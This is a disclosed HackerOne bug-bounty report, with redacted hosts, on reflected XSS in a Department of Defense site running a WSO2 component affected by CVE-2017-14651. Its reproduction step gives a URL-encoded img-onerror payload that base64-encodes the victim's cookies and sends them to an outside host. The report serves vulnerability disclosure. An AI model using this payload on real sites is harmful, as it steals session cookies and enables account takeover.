---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '1173593'
original_report_id: '1173593'
title: Reflected XSS at www.███████ at /██████████ via the ████████ parameter
weakness: Cross-site Scripting (XSS) - Reflected
team_handle: deptofdefense
created_at: '2021-04-24T05:50:46.410Z'
disclosed_at: '2021-06-03T16:25:25.825Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 8
tags:
- hackerone
- cross-site-scripting-xss-reflected
---

# Reflected XSS at www.███████ at /██████████ via the ████████ parameter

## Metadata

- HackerOne Report ID: 1173593
- Weakness: Cross-site Scripting (XSS) - Reflected
- Program: deptofdefense
- Disclosed At: 2021-06-03T16:25:25.825Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

**Description:**
The www.████████ site is using `████`, which is vulnerable to reflected XSS in the `/█████` component via the `█████████` parameter.

## References
https://www.cvedetails.com/cve/CVE-2017-14651/
https://docs.wso2.com/display/Security/Security+Advisory+WSO2-2017-0265

## Impact

An attacker can cause malicious code to execute in the victims browser, leading to credential theft, drive-by downloads, malicious redirects, and more.

## System Host(s)
www.██████████

## Affected Product(s) and Version(s)
████████

## CVE Numbers
CVE-2017-14651

## Steps to Reproduce
Browse to https://www.███████/███████?██████████=%3Cimg%20src=x%20onerror="a='http%3a%2f%2f███';b='%3Fcookie=';c=btoa(document.cookie);window.open(a%2bb%2bc)">

## Suggested Mitigation/Remediation Actions
Apply ███ (see references section)

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
